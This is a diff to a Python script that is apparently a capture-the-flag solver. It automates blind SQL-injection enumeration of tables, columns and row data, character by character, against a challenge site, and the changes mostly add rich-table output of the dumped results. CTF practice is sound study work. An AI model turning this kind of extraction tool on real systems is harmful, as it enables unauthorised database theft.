@@ -1,10 +1,10 @@
 #! /usr/bin/env python3
 import requests
 import string
-import json
-from urllib.parse import urlencode
+from rich.table import Table
+from rich.console import Console
 
-url = "https://chill-site-e2fca688ae1fae25.tjc.tf"
+url = "https://chill-site-a61ddfa23b0d7b75.tjc.tf/"
 charset = string.printable
 valid_word = "Password (hashed): 9a23b6d49aa244b7b0db52949c0932c365ec8191"
 def count_table():
@@ -47,7 +47,7 @@ def read_tableChar(tables_number):
                print(f"[+] Table Found: {table_name[i]}")
                pass
                if len(table_name) == tables_number:
-                   print(f"[+] Tables:{table_name}")
+                   #print(f"[+] Tables:{table_name}")
                    break           
     return table_name
 def count_columns(table: str):
@@ -137,18 +137,47 @@ def readChars(data_length,column_name,table_name):
             if (len(data_names[column_name][i]) == length):
                print(f"[+] Column {column_name} dumped::{data_names[column_name][i]}")
                pass
-               if len(data_names) == data_length:
+               if len(data_names[column_name]) == data_length:
                   print(f"[+] ColumnDumped::{data_names}")
+                  return data_names
                   break
-               
+def createTable(data: list) -> None:
+    table = Table(title="Tables")
+    console = Console()
+    table.add_column(f"Table_names::{len(data)}", justify="center", style="cyan", no_wrap=True)
+    for d in data:
+        table.add_row(d)
+    console.print(table)
+def createColumns(data: dict) -> None:
+    data_keys = data.keys()
+    console = Console()
+    table = Table(title="Tables Columns")
+    table.add_column(f"Table_names::{len(data)}", justify="center", style="cyan", no_wrap=True)
+    table.add_column(f"Column_names::{len(data)}", justify="left", style="cyan")
+    for i in data_keys: 
+        table.add_row(i,','.join(column for column in data[i]))
+    console.print(table)
+def createData(data: dict,table) -> None:
+    data_keys = data.keys()
+    console = Console()
+    table = Table(title=f"Table::{table}")
+    for d in data.keys():
+        table.add_column(f"{d}", justify="center", style="cyan", no_wrap=True)
+        for i in data[d]:
+            table.add_row(i)
+    console.print(table)
 if __name__ == "__main__":
     tables_number: str = count_table()
-    #tables = read_tableChar(tables_number)
-    tables = ['database']
+    tables = read_tableChar(tables_number)
+    #tables = ['database']
+    createTable(tables)
     for table in tables:
         column_number = count_columns(table)
         columns = read_columnChars(column_number,table)
         #columns = {'database': ['user', 'pass', 'time']}
+        createColumns(columns)
         for column in columns[table]:
             data_length = count_Data(column,table)
-            readChars(data_length,column,table)
+            data = readChars(data_length,column,table)
+            #data = {'user': ['You', 'test', 'TuxTheFlagMaster', 'humanA']}
+            createData(data,table)
